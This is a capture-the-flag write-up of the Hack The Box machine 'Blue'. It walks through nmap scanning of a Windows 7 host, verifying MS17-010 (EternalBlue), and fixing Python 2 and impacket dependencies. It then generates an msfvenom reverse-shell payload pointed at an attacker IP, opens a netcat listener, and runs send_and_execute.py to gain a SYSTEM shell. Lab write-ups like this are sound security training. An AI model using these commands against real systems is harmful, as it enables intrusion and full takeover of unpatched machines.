---
title: "HTB Blue"
date: 2022-18-12T18:22:03-05:00
draft: false
---

#### Initial nmap

```bash
nmap -p -T5 $IP

PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
2903/tcp  filtered extensisportfolio
6851/tcp  filtered unknown
10686/tcp filtered unknown
43145/tcp filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
51772/tcp filtered unknown
56599/tcp filtered unknown
56912/tcp filtered unknown
61146/tcp filtered unknown
64705/tcp filtered unknown
```

#### Concentrated nmap

```bash
sudo nmap -p 135,139,445,2903,6851,10686,43145,49152,49153,49154,49155,49156,49157,51772,56599,56912,61146,64705 -A -T5 $IP

PORT      STATE  SERVICE           VERSION                                                                                                                                                                                                  
135/tcp   open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
139/tcp   open   netbios-ssn       Microsoft Windows netbios-ssn                                                                                                                                                                            
445/tcp   open   microsoft-ds      Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                                                                                                           
2903/tcp  closed extensisportfolio                                                                                                                                                                                                          
6851/tcp  closed unknown                                                                                                                                                                                                                    
10686/tcp closed unknown                                                                                                                                                                                                                    
43145/tcp closed unknown                                                                                                                                                                                                                    
49152/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
49153/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
49154/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
49155/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
49156/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
49157/tcp open   msrpc             Microsoft Windows RPC                                                                                                                                                                                    
51772/tcp closed unknown                                                                                                                                                                                                                    
56599/tcp closed unknown                                                                                                                                                                                                                    
56912/tcp closed unknown                                                                                                                                                                                                                    
61146/tcp closed unknown                                                                                                                                                                                                                    
64705/tcp closed unknown                                                                                                                                                                                                                    
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (99%), Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%)                                                                                                                                                                  
No exact OS matches for host (test conditions non-ideal).                                                                                                                                                                                   
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-18T19:42:20
|_  start_date: 2022-12-18T19:34:24
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-18T19:42:19+00:00
|_clock-skew: mean: 2s, deviation: 1s, median: 1s

TRACEROUTE (using port 51772/tcp)
HOP RTT      ADDRESS
1   41.17 ms 10.10.14.1
2   41.24 ms 10.129.30.209
```

A lot of information comes back from the nmap scan, however the version that comes back on port 445 show us it is a windows 7 machine. With it being Win7 I believe it is valuable to check for EternalBlue.

(From the nmap scan above)
`Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)`

#### Finding & Exploiting Eternal Blue

Using a script from this repo I can gather the information needed to verify whether the machine is vulnerable to MS17-010 (EternalBlue). Not without a few issues first however.

Firstly, because the command python is pointed to python3 in the 2022.4 version of kali we much modify/add the shebang line at the top of each script we use to say `#!/usr/bin/python2`

Now that this is fixed I am receiving the following error - 

{{< image src="/static/Pasted image 20221218141024.png" alt="Error1" position="center" style="border-radius: 8px;" >}}

To fix this error I will clone impacket into the same working directory as the previous scripts `/htb/windows/blue/MS17-010` . This may vary depending on your workspace & how you have things setup in your environment.

#### Installing impacket -  
*This will require pip for python2*
To install pip for python2 run these commands
```bash
sudo apt update
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
```

Once finished continue to install impacket.

Step 1 - Clone the github repository
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

Step 2 - cd into the directory
```bash
cd impacket
```

Step 3 - install impacket using pip 
```bash
python2 setup.py install
```

Impacket has successfully installed however I am receiving another error.
{{< image src="/static/Pasted image 20221218142604.png" alt="Error2" position="center" style="border-radius: 8px;" >}}

I must install this dependencies as well.

```bash
pip2 install pyasn1_modules
```

Again for Cryptodome.Hash

```bash
pip2 install cryptodome && pip2 install cryptodomex
```

#### Running the script

```bash
./checker.py $IP

Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

#### Creating a reverse shell using an msfvenom payload

```bash 
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.88 LPORT=443 > svc_host.exe
```

#### Start netcat listener

```bash
nc -lvnp 443
```

#### Run send_and_execute.py

```bash
./send_and_execute.py $IP ../svc_host.exe 445 lsarpc
```

{{< image src="/static/Pasted image 20221218144853.png" alt="Error3" position="center" style="border-radius: 8px;" >}}

Looks like an access denied error. I will try and edit the script and add `guest` to the username line, and leave the password blank.

{{< image src="/static/Pasted image 20221218145035.png" alt="script_edit" position="center" style="border-radius: 8px;" >}}

Now I will rerun the script.

It completed succesfully, and i now have a reverse shell.

{{< image src="/static/Pasted image 20221218145224.png" alt="revshell" position="center" style="border-radius: 8px;" >}}

#### Post-Exploit - 

{{< image src="/static/Pasted image 20221218145359.png" alt="revshell" position="center" style="border-radius: 8px;" >}}

I am `nt authority\system`. This machine is rooted and complete. The flags can be found on the Desktop's of the user & administrator! 
